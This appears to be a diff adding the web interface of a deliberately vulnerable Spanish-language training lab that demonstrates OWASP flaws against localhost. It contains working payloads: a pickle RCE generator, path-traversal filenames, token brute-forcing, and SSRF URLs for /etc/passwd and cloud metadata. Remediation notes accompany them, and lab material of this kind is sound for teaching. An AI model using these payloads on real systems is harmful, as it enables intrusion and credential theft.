+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">Information Disclosure</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-red-950 text-red-400 font-bold border border-red-900/50">CRÍTICO · A05:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">El servidor expone datos sensibles sin autenticación.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Qué expone /info?</strong> Devuelve la <code class="text-sky-400">secret_key</code> de Flask (permite forjar cookies), todas las variables de entorno, ruta absoluta de la BD y el ejecutable de Python. Con la secret_key se comprometer toda la sesión.
+        </div>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 mb-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Consultar /info</h3>
+          <button onclick="testInfo()"
+            class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+            ▶ Obtener datos sensibles
+          </button>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">info_output</span>
+            <button onclick="clearTerm('term-info')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-info" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── BROKEN AUTH API ───────────────── -->
+    <div class="panel" id="p-api">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">Broken Authentication (API)</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-orange-950 text-orange-400 font-bold border border-orange-900/50">ALTO · A07:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">Token de API hardcodeado descubrible por fuerza bruta.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Cómo funciona?</strong> La API <code class="text-sky-400">/api/users</code> requiere header <code class="text-sky-400">X-Token</code>. El token correcto está hardcodeado como <code class="text-sky-400">"token123"</code>. Con él se obtiene la lista completa de usuarios, emails y roles.
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-4">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-2">Fuerza bruta de token</h3>
+            <p class="text-[10px] text-zinc-600 mb-3 leading-relaxed">Tokens: admin, token, secret, api_key, test, token123, 12345...</p>
+            <button onclick="bruteToken()"
+              class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+              ▶ Iniciar fuerza bruta
+            </button>
+          </div>
+
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Consulta manual</h3>
+            <div class="flex gap-2 items-end">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">X-Token</label>
+                <input type="text" id="api-token" placeholder="token..."
+                  class="block mt-1 w-36 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+              </div>
+              <button onclick="testApiToken()"
+                class="px-3 py-1.5 bg-sky-950 border border-sky-800 text-sky-400 rounded-lg text-xs hover:bg-sky-900 transition-colors">
+                ▶ Probar
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">api_output</span>
+            <button onclick="clearTerm('term-api')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-api" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── HTTP HEADERS ──────────────────── -->
+    <div class="panel" id="p-headers">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <h2 class="text-lg font-semibold text-zinc-100 mb-1">Analizador de Cabeceras HTTP</h2>
+        <p class="text-zinc-500 text-xs mb-6">Inspecciona las cabeceras de seguridad del servidor.</p>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 mb-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Verificar cabeceras</h3>
+          <div class="flex gap-2 items-end">
+            <div>
+              <label class="text-[10px] text-zinc-600 uppercase">URL objetivo</label>
+              <input type="text" id="headers-url" value="http://localhost:8080"
+                class="block mt-1 w-64 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+            </div>
+            <button onclick="testHeaders()"
+              class="px-3 py-1.5 bg-sky-950 border border-sky-800 text-sky-400 rounded-lg text-xs hover:bg-sky-900 transition-colors">
+              ▶ Analizar
+            </button>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">headers_output</span>
+            <button onclick="clearTerm('term-headers')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-headers" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── PORT SCANNER ──────────────────── -->
+    <div class="panel" id="p-portscanner">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <h2 class="text-lg font-semibold text-zinc-100 mb-1">Port Scanner</h2>
+        <p class="text-zinc-500 text-xs mb-6">Escaneo de puertos comunes desde el navegador.</p>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 mb-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Verificar puertos conocidos</h3>
+          <div class="flex gap-2 items-end">
+            <div>
+              <label class="text-[10px] text-zinc-600 uppercase">Host</label>
+              <input type="text" id="ps-host" value="localhost"
+                class="block mt-1 w-40 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+            </div>
+            <button onclick="scanPorts()"
+              class="px-3 py-1.5 bg-sky-950 border border-sky-800 text-sky-400 rounded-lg text-xs hover:bg-sky-900 transition-colors">
+              ▶ Escanear
+            </button>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden mb-4">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">portscan_output</span>
+            <button onclick="clearTerm('term-ps')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-ps" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-2">Escaneo completo desde terminal</h3>
+          <div class="text-xs text-zinc-400 font-mono space-y-1 leading-relaxed">
+            <div>cd pentesting_scripts/</div>
+            <div class="text-sky-400">python 01_port_scanner.py 127.0.0.1 1 9000</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── FILE UPLOAD ───────────────────── -->
+    <div class="panel" id="p-upload">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">File Upload sin validación</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-amber-950 text-amber-400 font-bold border border-amber-900/50">A05 · Misconfiguration</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">El servidor acepta cualquier archivo sin validar extensión, MIME ni tamaño.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">Tres vulnerabilidades en uno:</strong> Sin filtro de extensión (acepta <code class="text-sky-400">.py</code>, <code class="text-sky-400">.sh</code>, <code class="text-sky-400">.php</code>), path traversal con filenames como <code class="text-sky-400">../../../etc/cron.d/backdoor</code>, y sin límite de tamaño (posible DoS).
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-4">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Subir archivo — /upload</h3>
+            <div class="space-y-2">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Nombre del archivo</label>
+                <input type="text" id="upload-filename" value="shell.py"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+              </div>
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Contenido</label>
+                <textarea id="upload-content" rows="3"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono resize-y">import os; print(os.system('id'))</textarea>
+              </div>
+              <button onclick="testUpload()"
+                class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+                ▶ Subir archivo
+              </button>
+            </div>
+          </div>
+
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Path Traversal</h3>
+            <div class="space-y-2">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Filename con traversal</label>
+                <input type="text" id="upload-traversal" value="../../../tmp/pwned.txt"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+              </div>
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Contenido</label>
+                <textarea id="upload-traversal-content" rows="2"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono resize-y">pwned by vulnlab</textarea>
+              </div>
+              <button onclick="testUploadTraversal()"
+                class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+                ▶ Probar traversal
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden mb-4">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">upload_output</span>
+            <button onclick="clearTerm('term-upload')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-upload" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Remediación</h3>
+          <div class="space-y-1.5 text-xs font-mono text-zinc-400 leading-relaxed">
+            <div><span class="text-red-400">✗</span> save_path = os.path.join(UPLOAD_DIR, f.filename)</div>
+            <div><span class="text-emerald-400">✓</span> filename = secure_filename(f.filename)</div>
+            <div><span class="text-emerald-400">✓</span> Validar extensión contra lista blanca</div>
+            <div><span class="text-emerald-400">✓</span> Verificar MIME real con python-magic</div>
+            <div><span class="text-emerald-400">✓</span> Limitar tamaño con MAX_CONTENT_LENGTH</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── DESERIALIZACIÓN A08 ───────────── -->
+    <div class="panel" id="p-deserialize">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">Deserialización insegura</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-red-950 text-red-400 font-bold border border-red-900/50">CRÍTICO · A08:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">pickle.loads() ejecuta código arbitrario al deserializar objetos no confiables.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Por qué pickle es peligroso?</strong> Ejecuta el método <code class="text-sky-400">__reduce__</code> al deserializar. Un atacante que controla el payload puede hacer que el servidor ejecute cualquier comando — RCE completo, equivalente a Command Injection.
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-4">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Generar payload RCE</h3>
+            <div class="space-y-2">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Comando a ejecutar</label>
+                <input type="text" id="pickle-cmd" value="id"
+                  class="block w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+              </div>
+              <button onclick="generatePickle()"
+                class="px-3 py-1.5 bg-amber-950 border border-amber-800 text-amber-400 rounded-lg text-xs hover:bg-amber-900 transition-colors">
+                ▶ Generar payload base64
+              </button>
+            </div>
+          </div>
+
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Enviar al servidor — /deserialize</h3>
+            <div class="space-y-2">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Payload base64 (pickle)</label>
+                <textarea id="pickle-payload" rows="3" placeholder="Pega aquí el base64 generado..."
+                  class="block w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono resize-y"></textarea>
+              </div>
+              <button onclick="testDeserialize()"
+                class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+                ▶ Deserializar (RCE)
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden mb-4">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">deserialize_output — RCE via pickle</span>
+            <button onclick="clearTerm('term-deser')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-deser" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Comando para generar el payload</h3>
+          <div id="pickle-cmd-display" class="bg-zinc-950 border border-zinc-800 rounded-lg p-3 text-xs text-sky-400 font-mono leading-relaxed">
+            python3 -c "<br>import pickle, os, base64<br>class RCE:<br>&nbsp;&nbsp;def __reduce__(self): return (os.system, ('id',))<br>print(base64.b64encode(pickle.dumps(RCE())).decode())<br>"
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── LOGGING A09 ────────────────────── -->
+    <div class="panel" id="p-logging">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">Sin Logging de Seguridad</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-orange-950 text-orange-400 font-bold border border-orange-900/50">ALTO · A09:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">/admin no registra intentos. Compara con /admin-safe que sí genera logs.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Cuál es el riesgo?</strong> Sin logging, los ataques de fuerza bruta y accesos no autorizados pasan completamente desapercibidos. La media de detección sin logging es <strong class="text-zinc-200">más de 200 días</strong>.
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-4">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-2">Fuerza bruta /admin (sin logs)</h3>
+            <p class="text-xs text-zinc-500 mb-3">Prueba múltiples passwords — ninguno quedará registrado.</p>
+            <button onclick="bruteAdmin(false)"
+              class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+              ▶ Brute force /admin
+            </button>
+          </div>
+
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-2">Fuerza bruta /admin-safe (con logs)</h3>
+            <p class="text-xs text-zinc-500 mb-3">Mismo ataque — cada intento queda en <code class="text-sky-400 font-mono">/tmp/security.log</code>.</p>
+            <div class="flex gap-2">
+              <button onclick="bruteAdmin(true)"
+                class="px-3 py-1.5 bg-amber-950 border border-amber-800 text-amber-400 rounded-lg text-xs hover:bg-amber-900 transition-colors">
+                ▶ Brute force /admin-safe
+              </button>
+              <button onclick="viewLogs()"
+                class="px-3 py-1.5 bg-sky-950 border border-sky-800 text-sky-400 rounded-lg text-xs hover:bg-sky-900 transition-colors">
+                ■ Ver logs
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span id="logging-term-title" class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">logging_output</span>
+            <button onclick="clearTerm('term-logging')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-logging" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── SSRF A10 ───────────────────────── -->
+    <div class="panel" id="p-ssrf">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">SSRF — Server-Side Request Forgery</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-orange-950 text-orange-400 font-bold border border-orange-900/50">ALTO · A10:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">El servidor realiza peticiones a URLs del usuario sin validar host ni esquema.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Qué permite SSRF?</strong> El atacante usa el servidor como proxy para acceder a servicios internos, endpoints de administración, metadata cloud (AWS/GCP/Azure) y archivos locales. En cloud puede conducir a <strong class="text-zinc-200">robo de credenciales IAM</strong>.
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-4">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Payloads SSRF — /fetch?url=</h3>
+            <div class="space-y-2">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Payload</label>
+                <select onchange="document.getElementById('ssrf-url').value=this.value"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+                  <option value="http://127.0.0.1:5000/info">Acceder a /info interno</option>
+                  <option value="http://127.0.0.1:5000/api/users">Saltar auth → /api/users</option>
+                  <option value="http://127.0.0.1:5000/admin?password=admin123">/admin interno</option>
+                  <option value="file:///etc/passwd">Leer /etc/passwd</option>
+                  <option value="file:///flag.txt">Leer /flag.txt</option>
+                  <option value="http://169.254.169.254/latest/meta-data/">Metadata AWS</option>
+                </select>
+              </div>
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">URL objetivo</label>
+                <input type="text" id="ssrf-url" value="http://127.0.0.1:5000/info"
+                  class="block w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+              </div>
+              <button onclick="testSsrf()"
+                class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+                ▶ Ejecutar
+              </button>
+            </div>
+          </div>
+
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Impacto por escenario</h3>
+            <table class="w-full text-xs mb-4">
+              <thead><tr class="border-b border-zinc-800">
+                <th class="text-left pb-2 text-zinc-500 font-normal">URL</th>
+                <th class="text-left pb-2 text-zinc-500 font-normal">Impacto</th>
+              </tr></thead>
+              <tbody class="divide-y divide-zinc-800/40">
+                <tr><td class="py-1.5 font-mono text-zinc-400">/info</td><td class="py-1.5 text-red-400">Secret key → forjar sesiones</td></tr>
+                <tr><td class="py-1.5 font-mono text-zinc-400">/api/users</td><td class="py-1.5 text-red-400">Datos de todos los usuarios</td></tr>
+                <tr><td class="py-1.5 font-mono text-zinc-400">file:///etc/passwd</td><td class="py-1.5 text-orange-400">Usuarios del SO</td></tr>
+                <tr><td class="py-1.5 font-mono text-zinc-400">169.254.x.x</td><td class="py-1.5 text-red-400">Credenciales IAM cloud</td></tr>
+              </tbody>
+            </table>
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-2">Remediación</h3>
+            <div class="space-y-1 text-xs font-mono text-zinc-400">
+              <div><span class="text-red-400">✗</span> Listas negras de IPs (siempre bypass)</div>
+              <div><span class="text-emerald-400">✓</span> Lista blanca de dominios permitidos</div>
+              <div><span class="text-emerald-400">✓</span> Solo esquema https://</div>
+              <div><span class="text-emerald-400">✓</span> allow_redirects=False</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">ssrf_output — petición desde servidor</span>
+            <button onclick="clearTerm('term-ssrf')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-ssrf" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /#content -->
+</div><!-- /#main -->
+
+<script>
+const BASE = window.location.origin;
+
+// ─── Navigation ────────────────────────────────────────────
+function show(id) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
+  document.getElementById('p-' + id).classList.add('active');
+  event.currentTarget.classList.add('active');
+  document.getElementById('panel-title').textContent =
+    event.currentTarget.textContent.replace(/CRÍTICO|ALTO|MEDIO|INFO|AUTO/g, '').trim();
+}
+
+// ─── Terminal helpers ──────────────────────────────────────
+function term(id, html) {
+  const el = document.getElementById(id);
+  el.innerHTML += html + '\n';
+  el.scrollTop = el.scrollHeight;
+}
+function clearTerm(id) { document.getElementById(id).innerHTML = ''; }
+function tLine(cls, txt) { return `<span class="${cls}">${escHtml(txt)}</span>`; }
+function tRaw(cls, html) { return `<span class="${cls}">${html}</span>`; }
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+function prompt(cmd) {
+  return `<span class="t-prompt">vulnlab » </span><span class="t-cmd">${escHtml(cmd)}</span>`;
+}
+
+// ─── Status check ──────────────────────────────────────────
+async function checkStatus() {
+  const dot  = document.getElementById('status-dot');
+  const text = document.getElementById('status-text');
+  try {
+    const r = await fetch(BASE + '/api/health', { signal: AbortSignal.timeout(3000) });
+    if (r.ok) {
+      dot.className = 'dot online';
+      text.textContent = 'Servidor activo · ' + BASE;
+      document.getElementById('target-url').textContent = BASE;
+      return true;
+    }
+  } catch {}
+  dot.className = 'dot offline';
+  text.textContent = 'Servidor no disponible';
+  return false;
+}
+
+// ─── SQL Injection ─────────────────────────────────────────
+function updateSqliInput() {
+  document.getElementById('sqli-user').value = document.getElementById('sqli-payload').value;
+}
+function updateSqliSearch() {
+  document.getElementById('sqli-search-input').value = document.getElementById('sqli-search-payload').value;
+}
+
+async function testSqliLogin() {
+  const user = document.getElementById('sqli-user').value;
+  const pass = document.getElementById('sqli-pass').value;
+  term('term-sqli', prompt(`POST /login  username="${user}"  password="${pass}"`));
+
+  const form = new FormData();
+  form.append('username', user);
+  form.append('password', pass);
+  try {
+    const r = await fetch(BASE + '/login', { method: 'POST', body: form });
+    const html = await r.text();
+    if (html.includes('Bienvenido')) {
+      term('term-sqli', tRaw('t-err', '  [VULNERABLE] Login bypasseado — autenticado sin credenciales válidas'));
+      const m = html.match(/Bienvenido: (\w+)/);
+      if (m) term('term-sqli', tLine('t-warn', `  Usuario obtenido: ${m[1]}`));
+      updateOvStatus('sqli', true);
+      updateCounts();
+    } else {
+      term('term-sqli', tLine('t-ok', '  Credenciales rechazadas (no vulnerable con este payload)'));
+    }
+  } catch(e) {
+    term('term-sqli', tLine('t-err', '  Error de red: ' + e.message));
+  }
+}
+
+async function testSqliSearch() {
+  const q = document.getElementById('sqli-search-input').value;
+  term('term-sqli', prompt(`GET /search?q=${q}`));
+  try {
+    const r = await fetch(BASE + '/search?' + new URLSearchParams({q}));
+    const html = await r.text();
+    const hasData = /admin|password|alice|bob/i.test(html);
+    if (hasData) {
+      term('term-sqli', tLine('t-err', '  [VULNERABLE] Datos extraídos de la BD:'));
+      const rows = html.match(/<li>([^<]+)<\/li>/g) || [];
+      rows.forEach(row => {
+        const txt = row.replace(/<[^>]+>/g, '').trim();
+        if (txt) term('term-sqli', tLine('t-warn', '    › ' + txt));
+      });
+    } else {
+      term('term-sqli', tLine('t-ok', '  Sin datos sensibles en respuesta'));
+    }
+  } catch(e) {
+    term('term-sqli', tLine('t-err', '  Error: ' + e.message));
+  }
+}
+
+// ─── XSS ───────────────────────────────────────────────────
+async function testXss() {
+  const payload = document.getElementById('xss-input').value;
+  term('term-xss', prompt(`GET /search?q=${payload}`));
+  try {
+    const r = await fetch(BASE + '/search?' + new URLSearchParams({q: payload}));
+    const html = await r.text();
+    if (html.includes(payload)) {
+      term('term-xss', tLine('t-err', '  [VULNERABLE] Payload reflejado sin encodear en la respuesta HTML'));
+      term('term-xss', tLine('t-warn', '  Un atacante puede ejecutar JS arbitrario en el navegador de la víctima'));
+      term('term-xss', tLine('t-info', '  Abre la URL en el navegador para ver la alerta real'));
+      updateOvStatus('xss', true);
+      updateCounts();
+    } else if (html.includes(encodeURIComponent(payload))) {
+      term('term-xss', tLine('t-ok', '  Payload URL-encoded en respuesta — posiblemente mitigado'));
+    } else {
+      term('term-xss', tLine('t-ok', '  Payload no encontrado en respuesta — mitigado o filtrado'));
+    }
+  } catch(e) {
+    term('term-xss', tLine('t-err', '  Error: ' + e.message));
+  }
+}
+
+function openXssInBrowser() {
